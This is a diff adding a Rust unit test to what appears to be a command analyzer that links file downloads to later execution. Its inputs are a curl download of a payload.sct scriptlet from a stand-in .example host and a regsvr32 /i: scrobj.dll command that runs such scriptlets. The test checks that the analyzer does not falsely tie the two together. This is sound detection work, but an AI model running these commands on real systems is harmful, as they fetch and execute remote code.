@@ -16440,6 +16440,32 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
     }
 
     #[test]
+    fn regsvr32_current_dir_nested_scriptlet_does_not_use_unrelated_basename_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::interp::interpret_line(
+            r#"curl -o D:\Other\payload.sct https://regsvr32-current-dir-wrong-basename.example/payload.sct"#,
+            &mut env,
+        );
+        crate::interp::interpret_line(
+            r"regsvr32 /s /n /u /i:.\Temp\payload.sct scrobj.dll",
+            &mut env,
+        );
+
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == r"regsvr32 /s /n /u /i:.\Temp\payload.sct scrobj.dll"
+                            && url == "https://regsvr32-current-dir-wrong-basename.example/payload.sct"
+                )
+            }),
+            "regsvr32 current-dir nested scriptlet reused unrelated basename download: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn regsvr32_slash_equivalent_load_target_resolves_full_path_download_source() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::interp::interpret_line(
